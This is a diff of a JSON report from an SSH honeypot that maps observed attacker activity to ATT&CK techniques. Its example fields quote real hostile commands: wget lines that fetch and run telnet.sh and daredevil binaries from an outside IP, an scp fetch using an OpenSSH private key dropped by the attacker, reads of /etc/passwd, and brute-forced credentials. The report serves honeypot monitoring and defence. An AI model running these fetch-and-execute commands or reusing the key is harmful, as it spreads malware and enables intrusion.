@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-23 01:01:44",
+  "generated": "2026-08-23 02:01:25",
   "totals": {
-    "commands": 13,
-    "login_failed": 237,
-    "login_success": 8,
-    "sessions": 247
+    "commands": 30,
+    "login_failed": 268,
+    "login_success": 10,
+    "sessions": 303
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 237,
+      "count": 268,
       "examples": [
         "root / q1w2e3r4",
         "user / qwe123",
@@ -21,14 +21,14 @@
         "user / 150.136.155.47"
       ],
       "first": "2026-08-23T00:00:13.506843Z",
-      "last": "2026-08-23T01:00:46.362198Z",
-      "unique_ips": 11
+      "last": "2026-08-23T01:52:41.566602Z",
+      "unique_ips": 12
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 35,
+      "count": 36,
       "examples": [
         "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
         "http://176.65.139.202:80/telnet.sh",
@@ -37,28 +37,14 @@
         "http://176.65.139.202/daredevil.mips"
       ],
       "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T00:15:17.031224Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 9,
-      "examples": [
-        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
-        "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T00:31:56.572618Z",
+      "last": "2026-08-23T01:13:42.076504Z",
       "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 8,
+      "count": 10,
       "examples": [
         "hikvision / hikvision",
         "bin / bin",
@@ -67,33 +53,50 @@
         "root / 123123"
       ],
       "first": "2026-08-23T00:09:30.963003Z",
-      "last": "2026-08-23T00:31:53.771114Z",
-      "unique_ips": 5
+      "last": "2026-08-23T01:48:23.909740Z",
+      "unique_ips": 7
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 10,
+      "examples": [
+        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
+        "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $"
+      ],
+      "first": "2026-08-23T00:09:31.212472Z",
+      "last": "2026-08-23T01:13:42.076504Z",
+      "unique_ips": 3
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 7,
       "examples": [
         "uname -m",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "uname -a"
       ],
       "first": "2026-08-23T00:09:31.058995Z",
-      "last": "2026-08-23T00:31:56.572618Z",
-      "unique_ips": 2
+      "last": "2026-08-23T01:48:35.385183Z",
+      "unique_ips": 3
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
       ],
       "first": "2026-08-23T00:31:56.572618Z",
-      "last": "2026-08-23T00:31:56.572618Z",
-      "unique_ips": 1
+      "last": "2026-08-23T01:13:41.422234Z",
+      "unique_ips": 2
     },
     {
       "id": "T1059.004",
@@ -118,7 +121,72 @@
       "first": "2026-08-23T00:31:56.572618Z",
       "last": "2026-08-23T00:31:56.572618Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-08-23T01:13:41.426958Z",
+      "last": "2026-08-23T01:13:41.426958Z",
+      "unique_ips": 1
     }
   ],
-  "unmapped": []
+  "unmapped": [
+    [
+      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+      1
+    ],
+    [
+      "enable",
+      1
+    ],
+    [
+      "system",
+      1
+    ],
+    [
+      "shell",
+      1
+    ],
+    [
+      "sh",
+      1
+    ],
+    [
+      "bash",
+      1
+    ],
+    [
+      "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+      1
+    ],
+    [
+      "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
+      1
+    ],
+    [
+      "QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ",
+      1
+    ],
+    [
+      "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg",
+      1
+    ],
+    [
+      "AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9",
+      1
+    ],
+    [
+      "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
+      1
+    ],
+    [
+      "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
+      1
+    ]
+  ]
 }
